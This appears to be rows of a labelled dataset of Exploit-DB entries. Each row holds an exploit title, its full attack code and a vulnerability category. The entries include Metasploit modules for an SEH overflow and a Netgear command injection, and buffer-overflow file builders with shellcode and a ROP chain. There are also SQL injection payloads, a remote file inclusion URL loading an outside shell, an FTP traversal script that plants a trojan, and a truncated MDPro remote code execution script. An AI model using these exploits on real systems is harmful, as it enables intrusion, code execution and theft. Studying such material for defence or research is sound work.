""ins"" must be ""load"" or ""content"" 		ins_ok = [ 'load', 'content' ] 		ins = ins_ok[rand(ins_ok.length)]  		start = 'The specified Application/Action name is not defined.<p>Application:""' 		#middle = '""<p>Action:""'  		ia32 = Metasm::Ia32.new  		# SEH 		seh_offset = 1192 		seh_frame = rand_text(8)  		# Jump back to the payload, after p/p/r jumps to us. 		distance = seh_offset - start.length + seh_frame.length # dry run 		jmp_back = Metasm::Shellcode.assemble(ia32, ""jmp $-"" + distance.to_s).encode_string 		distance = seh_offset - start.length - jmp_back.length 		distance += 8 if ins == 'content' 		jmp_back = Metasm::Shellcode.assemble(ia32, ""jmp $-"" + distance.to_s).encode_string  		# A short jump back to the long jump back :) 		jmp_small = Metasm::Shellcode.assemble(ia32, ""jmp $-"" + jmp_back.length.to_s).encode_string  		# Fix up the SEH frame 		seh_frame[0,jmp_small.length] = jmp_small 		seh_frame[4,4] = [target.ret].pack('V')  		# Create the buffer 		buf = '' 		buf << payload.encoded 		pad = seh_offset - start.length - buf.length - jmp_back.length 		pad += 8 if ins == 'content' 		buf << rand_text(pad) 		buf << jmp_back 		buf << seh_frame  		app = buf  		# Force an exception writing off the end of the stack 		action = rand_text(1024)  		# Send the request 		if rand(2) > 0 			print_status(""Sending exploit via POST request (ins=#{ins})..."") 			res = send_request_cgi({ 				'uri'		  => cgi, 				'method'	  => ""POST"", 				'vars_post' => 					{ 						'ins' => ins, 						'act' => action, 						'app' => app 					} 			}, 3) 		else 			print_status(""Sending exploit via GET request (ins=#{ins})..."") 			res = send_request_cgi({ 				'uri'		  => cgi, 				'method'	  => ""GET"", 				'vars_get' => 					{ 						'ins' => ins, 						'act' => action, 						'app' => app 					} 			}, 3) 		end  		if res and res.code != 502 			print_error(""Eek! We weren't expecting a response, but we got one"") 			print_status(res.inspect) if datastore['NNM_DEBUG'] 		end  		handler  	end  	def wfs_delay 		5 	end  end",Remote Buffer Overflow,1
42257,"Netgear DGN2200 - 'dnslookup.cgi' Command Injection (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'net/http' require ""base64""  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient    def initialize(info = {})     super(update_info(info,       'Name'                 => ""Netgear DGN2200 dnslookup.cgi Command Injection"",       'Description'          => %q{         This module exploits a command injection vulnerablity in NETGEAR         DGN2200v1/v2/v3/v4 routers by sending a specially crafted post request         with valid login details.       },       'License'              => MSF_LICENSE,       'Platform'             => 'unix',       'Author'               => [         'thecarterb',  # Metasploit Module         'SivertPL'     # Vuln discovery       ],       'DefaultTarget'        => 0,       'Privileged'           => true,       'Arch'                 => [ARCH_CMD],       'Targets'              => [         [ 'NETGEAR DDGN2200 Router', { } ]       ],       'References'           =>         [           [ 'EDB', '41459'],           [ 'CVE', '2017-6334']         ],       'DisclosureDate' => 'Feb 25 2017',     ))      register_options(       [         Opt::RPORT(80),         OptString.new('USERNAME', [true, 'Username to authenticate with', '']),         OptString.new('PASSWORD', [true, 'Password to authenticate with', ''])       ])      register_advanced_options(     [       OptString.new('HOSTNAME', [true, '""Hostname"" to look up (doesn\'t really do anything important)', 'www.google.com'])     ])     end    # Requests the login page which tells us the hardware version   def check     res = send_request_cgi({'uri'=>'/'})     if res.nil?       fail_with(Failure::Unreachable, 'Connection timed out.')     end      # Checks for the `WWW-Authenticate` header in the response     if res.headers[""WWW-Authenticate""]       data = res.to_s       marker_one = ""Basic realm=\""NETGEAR ""       marker_two = ""\""""       model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]       vprint_status(""Router is a NETGEAR router (#{model})"")       model_numbers = ['DGN2200v1', 'DGN2200v2', 'DGN2200v3', 'DGN2200v4']       if model_numbers.include?(model)         print_good(""Router may be vulnerable (NETGEAR #{model})"")         return CheckCode::Detected       else         return CheckCode::Safe       end     else       print_error('Router is not a NETGEAR router')       return CheckCode::Safe     end   end    def exploit     check      # Convert datastores     user = datastore['USERNAME']     pass = datastore['PASSWORD']     hostname = datastore['HOSTNAME']      vprint_status(""Using encoder: #{payload.encoder} "")     print_status('Sending payload...')      vprint_status(""Attempting to authenticate with: #{user}:#{pass} (b64 encoded for auth)"")      creds_combined = Base64.strict_encode64(""#{user}:#{pass}"")     vprint_status(""Encoded authentication: #{creds_combined}"")      res = send_request_cgi({       'uri'         => '/dnslookup.cgi',       'headers'     => {         'Authorization' => ""Basic #{creds_combined}""       },       'vars_post'   => {         'lookup'    => 'Lookup',         'host_name' => hostname + '; ' + payload.encoded     }})    end end",Command Injection,1
7652,"Destiny Media Player 1.61 - '.lst' Local Buffer Overflow (PoC) # # Destiny Media Player (lst file) Buffer overflow PoC # By:Encrypt3d.M!nd # I'am Iraqian...Not Arabian ########################################### #  Well,i've tried to write an exploit for this shit but i couldn't # the address after the NEW eip will over written,if anyone # knows how to exploit this,be my guest  chars = ""A""*2052 eip = ""\x42\x42\x42\x42"" # the eip will become 42424242  file=open('exp.lst','w') file.write(chars+eip+chars) file.close()  # milw0rm.com [2009-01-03]",Local Buffer Overflow,1
8249,"BS.Player 2.34 Build 980 - '.bsl' Local Buffer Overflow (SEH) <?php /* Bs.Player <= 2.34 Build 980 (.bsl) local buffer overflow 0day exploit (seh) by Nine:Situations:Group::pyrokinesis  Overlong hostnames in bsplayer playlist files causes eax and seh handlers to be overwritten. Cannot reliably debug with olly because of code compression, just used faultmon/memdump/msfpescan and I choosed the easy/universal way with seh. There are some pop ret addresses in common among the vulnerable versions...  Well it says local but I consider it a remote one because .bsl files are associated to the program Tested and working against:  ... v2.32 Build 975 Free v2.34 Build 980 PRO win xp pro sp2 / sp3 win 2k3 sp1  not vulnerable: v2.35 Build 985 PRO V2.36 Build 990 Free/Pro   */ $buffer= ""\x23\x45\x58\x54\x4d\x33\x55\x0d\x0a\x23\x45\x58\x54\x49\x4e\x46"". ""\x3a\x30\x2c\x41\x41\x41\x41\x0d\x0a\x68\x74\x74\x70\x3a\x2f\x2f"". ""\x52\x61\x77\x2d\x48\x69\x67\x68\x2e"";  $nop1=str_repeat(""\x90"",384); $eax_again=""BBBB""; $nop2=str_repeat(""\x90"",12); $eax=""CCCC""; $nop3=str_repeat(""\x90"",8); $jnk=$nop1.$eax_again.$nop2.$eax.$nop3;  $jmp=""\xeb\x08\x90\x90"";  $seh=""\xb1\xad\x41\x00""; //0x0041adb1   pop pop ret bsplayer.exe  $nop4=str_repeat(""\x90"",100);  // win32_exec -  EXITFUNC=seh CMD=calc Size=330 Encoder=Alpha2 http://metasploit.com $scode= ""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"". ""\x49\x49\x49\x49\x49\x49\x49\x49\x49\x37\x49\x49\x51\x5a\x6a\x47"". ""\x58\x50\x30\x42\x31\x41\x42\x6b\x42\x41\x57\x32\x42\x42\x42\x32"". ""\x41\x41\x30\x41\x41\x58\x38\x42\x42\x50\x75\x59\x79\x4b\x4c\x69"". ""\x78\x37\x34\x67\x70\x45\x50\x75\x50\x6c\x4b\x61\x55\x45\x6c\x6e"". ""\x6b\x71\x6c\x73\x35\x62\x58\x66\x61\x6a\x4f\x4c\x4b\x42\x6f\x56"". ""\x78\x4c\x4b\x71\x4f\x77\x50\x57\x71\x6a\x4b\x72\x69\x6e\x6b\x75"". ""\x64\x4e\x6b\x75\x51\x68\x6e\x30\x31\x59\x50\x4d\x49\x4c\x6c\x4f"". ""\x74\x69\x50\x31\x64\x36\x67\x4f\x31\x4a\x6a\x44\x4d\x75\x51\x68"". ""\x42\x38\x6b\x5a\x54\x35\x6b\x62\x74\x75\x74\x37\x74\x70\x75\x68"". ""\x65\x4c\x4b\x51\x4f\x35\x74\x73\x31\x4a\x4b\x50\x66\x6c\x4b\x44"". ""\x4c\x50\x4b\x6c\x4b\x41\x4f\x77\x6c\x34\x41\x7a\x4b\x6c\x4b\x67"". ""\x6c\x6e\x6b\x37\x71\x6a\x4b\x4d\x59\x33\x6c\x71\x34\x54\x44\x39"". ""\x53\x55\x61\x6f\x30\x41\x74\x6c\x4b\x37\x30\x70\x30\x6e\x65\x4b"". ""\x70\x61\x68\x66\x6c\x6e\x6b\x61\x50\x36\x6c\x6e\x6b\x74\x30\x65"". ""\x4c\x6e\x4d\x6c\x4b\x71\x78\x64\x48\x68\x6b\x76\x69\x6c\x4b\x4f"". ""\x70\x48\x30\x75\x50\x75\x50\x55\x50\x4e\x6b\x63\x58\x67\x4c\x31"". ""\x4f\x56\x51\x4a\x56\x53\x50\x41\x46\x4f\x79\x4b\x48\x4b\x33\x39"". ""\x50\x61\x6b\x32\x70\x53\x58\x6c\x30\x4c\x4a\x65\x54\x53\x6f\x63"". ""\x58\x7a\x38\x49\x6e\x4e\x6a\x54\x4e\x70\x57\x69\x6f\x58\x67\x62"". ""\x43\x72\x41\x70\x6c\x70\x63\x43\x30\x47"";  $buffer.=$jnk.$jmp.$seh.$nop4.$scode; $buffer.= ""x56\x37\x2e\x46\x4d\x2f\x6c\x69\x73\x74\x65\x6e\x2e\x70"". ""\x6c\x73\x0d\x0a\x00"";  $fp=fopen(""evil.bsl"",""w+""); if (!$fp) {die(""cannot create evil.bsl!"");} @fputs($fp,$buffer); @fclose($fp); ?>  # milw0rm.com [2009-03-20]",Local Buffer Overflow,1
17275,"A-PDF All to MP3 Converter 2.0.0 - DEP Bypass # Exploit Title: A-PDF All to MP3 Converter v.2.0.0 DEP Bypass # Software Link: http://www.a-pdf.com/all-to-mp3/download.htm # Version: 2.0.0 # Tested on: Win XP SP3 French # Date: 12/05/2011 # Author: h1ch4m # Email: h1ch4m@live.fr # Home: http://net-effects.blogspot.com # Big thanks to corelanc0d3r for the Help & the Precious advices  my $file= ""1.wav""; my $size = 8000; my $junk = ""\x41"" x 4136;  #######################      STACK PIVOT      ########################### my $SEH = pack('V', 0x00408E66);        # ADD ESP,400 # RETN - Alltomp3.exe -  ** Null byte ** my $JUNK_TO_ROP = ""D"" x 40;  #######################     STACK POINTER     ########################### my $ROP = pack('V', 0x0042C86F);        # PUSH ESP # POP EDI # POP ESI # POP EBX # RETN [Module : Alltomp3.exe]  ** Null byte ** $ROP .= ""A"" x 8;  $ROP .= pack('V', 0x1003176D);          # MOV EAX,EDI # POP ESI # RETN [Module : lame_enc.dll]  **  $ROP .= ""A"" x 4; $ROP .= pack('V', 0x1001FF5D);          # ADD ESP,18 # RETN - lame_enc.dll -  **   ############ Parameters for VirtualProtect() ############ $ROP .= pack('V', 0x7c801ad4);          # VirtualProtect()  0x7c801ad4 Kernel32.dll $ROP .= ""AAAA"";                         # Parameter 1 $ROP .= ""BBBB"";                         # Parameter 2 $ROP .= ""CCCC"";                         # Parameter 3 $ROP .= ""DDDD"";                         # Parameter 4 $ROP .= pack(""V"", 0x6D00E010);          # Writeable address  ######################   PARAMETER 1  ########################### $ROP .= pack('V', 0x004081CB);          # ADD EAX,10 # RETN [Module : Alltomp3.exe]  ** Null byte ** $ROP .= pack('V', 0x1002B910);          # ADD EAX,8 # RETN [Module : lame_enc.dll]  **  $ROP .= pack('V', 0x004BB477);          # MOV ECX,EAX # MOV EAX,ECX # RETN [Module : Alltomp3.exe]  ** Null byte ** $ROP .= pack('V', 0x1003176D);          # MOV EAX,EDI # POP ESI # RETN [Module : lame_enc.dll]  **  $ROP .= ""A"" x 4; $ROP .= pack('V', 0x1003C6A4);          # ADD EAX,100 # POP EBP # RETN [Module : lame_enc.dll]  **  $ROP .= ""A"" x 4; $ROP .= pack('V', 0x1003C67A);          # ADD EAX,80 # POP EBP # RETN [Module : lame_enc.dll]  **  $ROP .= ""A"" x 4; $ROP .= pack('V', 0x1003C696);          # ADD EAX,40 # POP EBP # RETN [Module : lame_enc.dll]  **  $ROP .= ""A"" x 4; $ROP .= pack('V', 0x1002B23D);          # ADD EAX,20 # RETN [Module : lame_enc.dll]  **  $ROP .= pack('V', 0x004081CB);          # ADD EAX,10 # RETN [Module : Alltomp3.exe]  ** Null byte ** $ROP .= pack('V', 0x1003303A);          # MOV DWORD PTR DS:[ECX],EAX # RETN 	[Module : lame_enc.dll]  **  ######################   PARAMETER 2  ########################### $ROP .= pack('V', 0x10002388);          # MOV DWORD PTR DS:[ECX+4],EAX # XOR EAX,EAX # RETN [Module : lame_enc.dll]  ** Null byte **  ######################   PARAMETER 3  ########################### $ROP .= pack('V', 0x1003C6A4);          # ADD EAX,100 # POP EBP # RETN [Module : lame_enc.dll]  ** $ROP .= ""A"" x 4; $ROP .= pack('V', 0x1003C6A4);          # ADD EAX,100 # POP EBP # RETN [Module : lame_enc.dll]  ** $ROP .= ""A"" x 4; $ROP .= pack('V', 0x1003C6A4);          # ADD EAX,100 # POP EBP # RETN [Module : lame_enc.dll]  ** $ROP .= ""A"" x 4; $ROP .= pack('V', 0x100023D1);          # MOV DWORD PTR DS:[ECX+8],EAX # XOR EAX,EAX # RETN [Module : lame_enc.dll]  ** Null byte **  ######################   PARAMETER 4  ########################### $ROP .= pack('V', 0x1003C696);          # ADD EAX,40 # POP EBP # RETN [Module : lame_enc.dll]  **  $ROP .= ""A"" x 4; $ROP .= pack('V', 0x100023A8);          # MOV DWORD PTR DS:[ECX+C],EAX # XOR EAX,EAX # RETN [Module : lame_enc.dll]  ** Null byte **  ################### Jump To VirtualProtect() ##################### $ROP .= pack('V', 0x1003176D);          # MOV EAX,EDI # POP ESI # RETN  [Module : lame_enc.dll]  **  $ROP .= ""A"" x 4; $ROP .= pack('V', 0x004081CB);          # ADD EAX,10 # RETN [Module : Alltomp3.exe]  ** Null byte ** $ROP .= pack('V', 0x0040C10B);          # ADD EAX,4 # POP EBX # RETN [Module : Alltomp3.exe]  ** Null byte ** $ROP .= ""A"" x 4; $ROP .= pack('V', 0x6D00C3D1);          # XCHG EAX,ESP # RETN [Module : CDRip122.dll]  ** Null byte **  #######################    NOPS     ########################### my $NOPS = ""\x90"" x (500-length($ROP));  #######################  SHELLCODE  ########################### # windows/exec - 223 bytes # http://www.metasploit.com # Encoder: x86/shikata_ga_nai # EXITFUNC=seh, CMD=calc my $shellcode = ""\xda\xdd\xbf\xb0\x1a\x64\x4f\xd9\x74\x24\xf4\x58\x31\xc9"" . ""\xb1\x32\x31\x78\x17\x83\xc0\x04\x03\xc8\x09\x86\xba\xd4"" . ""\xc6\xcf\x45\x24\x17\xb0\xcc\xc1\x26\xe2\xab\x82\x1b\x32"" . ""\xbf\xc6\x97\xb9\xed\xf2\x2c\xcf\x39\xf5\x85\x7a\x1c\x38"" . ""\x15\x4b\xa0\x96\xd5\xcd\x5c\xe4\x09\x2e\x5c\x27\x5c\x2f"" . ""\x99\x55\xaf\x7d\x72\x12\x02\x92\xf7\x66\x9f\x93\xd7\xed"" . ""\x9f\xeb\x52\x31\x6b\x46\x5c\x61\xc4\xdd\x16\x99\x6e\xb9"" . ""\x86\x98\xa3\xd9\xfb\xd3\xc8\x2a\x8f\xe2\x18\x63\x70\xd5"" . ""\x64\x28\x4f\xda\x68\x30\x97\xdc\x92\x47\xe3\x1f\x2e\x50"" . ""\x30\x62\xf4\xd5\xa5\xc4\x7f\x4d\x0e\xf5\xac\x08\xc5\xf9"" . ""\x19\x5e\x81\x1d\x9f\xb3\xb9\x19\x14\x32\x6e\xa8\x6e\x11"" . ""\xaa\xf1\x35\x38\xeb\x5f\x9b\x45\xeb\x07\x44\xe0\x67\xa5"" . ""\x91\x92\x25\xa3\x64\x16\x50\x8a\x67\x28\x5b\xbc\x0f\x19"" . ""\xd0\x53\x57\xa6\x33\x10\xa9\x57\x8e\x8c\x3e\xce\x7b\xed"" . ""\x22\xf1\x51\x31\x5b\x72\x50\xc9\x98\x6a\x11\xcc\xe5\x2c"" . ""\xc9\xbc\x76\xd9\xed\x13\x76\xc8\x8d\xf2\xe4\x90\x51"";  my $REST = ""\x42"" x ($size-length($junk.$SEH.$JUNK_TO_ROP.$ROP.$NOPS.$shellcode));  open($FILE,"">$file""); print $FILE $junk.$SEH.$JUNK_TO_ROP.$ROP.$NOPS.$shellcode.$REST; close($FILE); print ""File Created successfully\n""; sleep(1);",DEP Bypass,1
35601,"Etki Video PRO 2.0 - 'izle.asp?id' SQL Injection source: https://www.securityfocus.com/bid/47298/info  Etki Video Pro is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in an SQL query.  A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.  Etki Video Pro 2.0 is vulnerable; other versions may also be affected.   http://www.example.com/[path]/izle.asp?id=254 [SQL Injection]",SQL Injection,1
12776,"Realtor WebSite System E-Commerce - idfestival SQL Injection -------------------------------------------------------------------------------------------  Realtor WebSite System E-Commerce (""all files"".php SQL Injection Vulnerability   -------------------------------------------------------------------------------------------   Author : CoBRa_21  Script Home : http://www.redcatstudios.net/   Dork : ""Web Site Design by Red Cat Studios""  -------------------------------------------------------------------------------------------   SQL Injection:   http://localhost/[path]/sponsorslist.php?idfestival=-7 (SQL) http://localhost/[path]/index2.php?idfestival=7 (SQL) http://localhost/[path]/venues.php?idfestival=7 (SQL) http://localhost/[path]/getpasses_new.php?idfestival=7 (SQL) http://localhost/[path]/awards.php?idfestival=7 (SQL) http://localhost/[path]/mailing.php?idfestival=7 (SQL) http://localhost/[path]/news.php?idfestival=7 (SQL) http://localhost/[path]/filmlist.php?idfestival=7 (SQL) http://localhost/[path]/calendar.php?idfestival=7 (SQL) http://localhost/[path]/gallery.php?idfestival=7 (SQL) http://localhost/[path]/gallery.php?idfestival=7&idgallery=56 (SQL) http://localhost/[path]/contact.php?idfestival=7 (SQL) http://localhost/[path]/  (All Files).php?idfestival= (SQL)  -------------------------------------------------------------------------------------------",SQL Injection,1
30465,Mapos-Scripts.de Gastebuch 1.5 - 'index.php' Remote File Inclusion source: https://www.securityfocus.com/bid/25252/info  Mapos-Scripts.de Gastebuch is prone to a remote file-include vulnerability because the application fails to properly sanitize user-supplied input.  An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.  Gastebuch 1.5 is vulnerable; other versions may also be affected.   http://www.example.com/index.php?config[root_ordner]=http://www.example2.com/shell.txt?&cmd=id,Remote File Inclusion,1
38769,"Monstra CMS 1.2.0 - 'login' SQL Injection source: https://www.securityfocus.com/bid/62572/info  Monstra CMS is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Monstra 1.2.0 is vulnerable; other versions may also be affected.  POST /admin/ HTTP/1.1 Content-Length: 72 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Cookie: PHPSESSID=f6bd4782f77e4027d3975d32c414a36d Host: XXX Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) Accept: */* login=-1' or 85 = '83&login_submit=Enter&password=lincoln.dll",SQL-injection,1
1417,"Farmers WIFE 4.4 sp1 - 'FTP' Remote System Access #!/usr/bin/perl # kokanin 20060106 // farmers wife server 4.4 sp1 allows us to  # use ../../../ patterns as long as we stand in a folder where we have write access. # haha, that's what you get for implementing your own access control instead of relying on the underlying OS. # default port is 22003, default writable path is /guests.  # 0day 0day, private, distribute and die bla bla bla # leet (translated) note from <anonymized>: you can log in as IEUser/mail@mail.com or anonymous/mail@mail.com # on _all_ farmers wife servers. This can't be disabled unless you turn off FTP access. The anonymous # login gives you guest access, which means write access to /guests, which means default remote 'root' # aka SYSTEM access. Ha ha ha, thanks anonymized, I missed that bit.   if(!$ARGV[0]){ die ""Usage: ./thisscript.pl <ip> [user] [pass] [port] [path] [trojan.exe] [/path/to/target.exe] \n"";} # as in: ./thisscript.pl 123.45.67.89 demo demo 22003 /writablepath /etc/hosts /owned.txt # by default we just put /etc/hosts in a file called owned.txt in the root of the drive -  # nuke %SYSTEMROOT%\system32\at.exe and wait for windows to run it.  # We can check for the %SYSTEMROOT% with the SIZE command to determine the proper # location for our trojan.  use Net::FTP; my $target = $ARGV[0]; my $dotdot = ""../../../../../../../../../../../../../../""; # Here we set defaults (It's ugly, I know) that gives REMOTE REWT OMGOMG I MEAN SYSTEM if($ARGV[1]){ $user = $ARGV[1] } else { $user = ""IEUser"";} if($ARGV[2]){ $pass = $ARGV[2] } else { $pass = ""mail\@mail.com"";} if($ARGV[3]){ $port = $ARGV[3] } else { $port = ""22003"";} if($ARGV[4]){ $writablepath = $ARGV[4] } else { $writablepath = ""/guests"";} if($ARGV[5]){ $trojan = $ARGV[5] } else { $trojan = ""/etc/hosts"";} if($ARGV[6]){ $destination = $ARGV[6] } else { $destination = ""owned.txt"";} print "" target: $target \n user: $user \n pass: $pass \n port: $port \n writable path: $writablepath \n trojan: $trojan \n targetfile: $destination \n"";  # Open the command socket use Net::FTP; $ftp = Net::FTP->new(""$target"",                       Debug => 0,                       Port => ""$port"") 	or die ""Cannot connect: $@""; 	$ftp->login(""$user"",""$pass"") 	or die ""Cannot login "", $ftp->message; 	$ftp->cwd(""$writablepath"") 	# this software is so shitty, it allows us to CWD to any folder and just pukes later if it's not there. 	or die ""Cannot go to writable dir "", $ftp->message; 	# leet %SYSTEMROOT% scan by determining where at.exe is using SIZE 	my @systemroots = (""PUNIX"",""WINXP"",""WINNT"",""WIN2000"",""WIN2K"",""WINDOWS"",""WINDOZE""); 	for(@systemroots){ 		$reply = $ftp->quot(""SIZE "" . $dotdot . $_ . ""/system32/at.exe""); 		if($reply == 2) { print "" %SYSTEMROOT% is /$_\n"";my $systemroot=$_; } 		} 	$ftp->binary; 	$ftp->put(""$trojan"",""$dotdot"".""$destination"") 	and print ""file successfully uploaded, donate money to kokanin\@gmail.com\n"" or die ""Something messed up, file upload failed "", $ftp->message; $ftp->quit;  # milw0rm.com [2006-01-14]",Remote System Access,1
36215,"Joomla! Component com_expedition - 'id' SQL Injection source: https://www.securityfocus.com/bid/50019/info  The 'com_expedition' component for Joomla! is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/index.php?option=com_expedition&task=detail&id=-3235'",SQL-injection,1
2712,"MDPro 1.0.76 - 'Cookie PNSVlang' Local File Inclusion <?  print ' :::::::::  :::::::::: :::     ::: ::::::::::: :::         :+:    :+: :+:        :+:     :+:     :+:     :+:         +:+    +:+ +:+        +:+     +:+     +:+     +:+         +#+    +:+ +#++:++#   +#+     +:+     +#+     +#+         +#+    +#+ +#+         +#+   +#+      +#+     +#+         #+#    #+# #+#          #+#+#+#       #+#     #+#         #########  ##########     ###     ########### ##########  ::::::::::: ::::::::::     :::     ::::    ::::       :+:     :+:          :+: :+:   +:+:+: :+:+:+      +:+     +:+         +:+   +:+  +:+ +:+:+ +:+      +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+      +#+     +#+        +#+     +#+ +#+       +#+      #+#     #+#        #+#     #+# #+#       #+#      ###     ########## ###     ### ###       ###  	    - - [DEVIL TEAM THE BEST POLISH TEAM] - -    [Exploit name: MDPro <= 1.0.76 (PNSVlang) Remote Code Execution Exploit [Script name: MDPro 1.0.76 [Script site: http://www.maxdev.com/ dork: ""This web site was made with MD-Pro""  Find by: Kacper (a.k.a Rahim)   ========>  DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam  <======== ========>         http://www.rahim.webd.pl/            <========  Contact: kacper1964@yahoo.pl  (c)od3d by Kacper -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- Greetings DragonHeart and all DEVIL TEAM Patriots :) - Leito & Leon  TomZen, Gelo, Ramzes, DMX, Ci2u, Larry, @steriod, Drzewko, CrazzyIwan, Rammstein Adam., Kicaj., DeathSpeed, Arkadius, Michas, pepi, nukedclx, SkD, MXZ, sysios,  mIvus, nukedclx, SkD, wacky, xoron -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-                 Greetings for 4ll Fusi0n Group members ;-)                 and all members of hacker.com.pl ;) -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- '; /* Vulnerability based on cookie lang :)  Kacper */ if ($argc<7) { print_r(' ----------------------------------------------------------------------------- Usage: php '.$argv[0].' host path username password session_id cmd OPTIONS host:       target server (ip/hostname) path:       MDPro path username:   You username password:   You password session_id: register in MDPro, login and insert you session id cmd:        a shell command (ls -la) Options:  -p[port]:    specify a port other than 80  -P[ip:port]: specify a proxy Example: php '.$argv[0].' 2.2.2.2 /MDPro/ 07e0ed91d7ffab69312a5ab3db4b827d ls -la -P1.1.1.1:80 php '.$argv[0].' 1.1.1.1 /  -p81 ----------------------------------------------------------------------------- ');  die; }  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacket($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock); } function make_seed() {    list($usec, $sec) = explode(' ', microtime());    return (float) $sec + ((float) $usec * 100000); }  $host=$argv[1]; $path=$argv[2]; $username=$argv[3]; $password=$argv[4]; $session=$argv[5]; $cmd="""";  $port=80; $proxy=""""; for ($i=6; $i<$argc; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } } if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}  $data.='-----------------------------7d6224c08dc Content-Disposition: form-data; name=""uname""  '.$username.' -----------------------------7d6224c08dc Content-Disposition: form-data; name=""pass""  '.$password.' -----------------------------7d6224c08dc Content-Disposition: form-data; name=""submit""  Login -----------------------------7d6224c08dc-- ';   echo ""login...\n""; $packet =""POST "".$p.""user.php HTTP/1.0\r\n""; $packet.=""Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacket($packet); sleep(1);   $hauru= ""\x20\x0d\x0a\x47\x49\x46\x38\x36\x0d\x0a\x3c\x3f\x70\x68\x70\x20"". ""\x6f\x62\x5f\x63\x6c\x65\x61\x6e\x28\x29\x3b\x0d\x0a\x2f\x2f\x52"". ""\x75\x63\x68\x6f\x6d\x79\x20\x7a\x61\x6d\x65\x6b\x20\x48\x61\x75"". ""\x72\x75\x20\x3b\x2d\x29\x0d\x0a\x65\x63\x68\x6f\x22\x2e\x2e\x2e"". ""\x48\x61\x63\x6b\x65\x72\x2e\x2e\x4b\x61\x63\x70\x65\x72\x2e\x2e"". ""\x4d\x61\x64\x65\x2e\x2e\x69\x6e\x2e\x2e\x50\x6f\x6c\x61\x6e\x64"". ""\x21\x21\x2e\x2e\x2e\x44\x45\x56\x49\x4c\x2e\x54\x45\x41\x4d\x2e"". ""\x2e\x74\x68\x65\x2e\x2e\x62\x65\x73\x74\x2e\x2e\x70\x6f\x6c\x69"". ""\x73\x68\x2e\x2e\x74\x65\x61\x6d\x2e\x2e\x47\x72\x65\x65\x74\x7a"". ""\x2e\x2e\x2e\x22\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x65\x63\x68"". ""\x6f\x22\x2e\x2e\x2e\x47\x6f\x20\x54\x6f\x20\x44\x45\x56\x49\x4c"". ""\x20\x54\x45\x41\x4d\x20\x49\x52\x43\x3a\x20\x37\x32\x2e\x32\x30"". ""\x2e\x31\x38\x2e\x36\x3a\x36\x36\x36\x37\x20\x23\x64\x65\x76\x69"". ""\x6c\x74\x65\x61\x6d\x22\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x65"". ""\x63\x68\x6f\x22\x2e\x2e\x2e\x44\x45\x56\x49\x4c\x20\x54\x45\x41"". 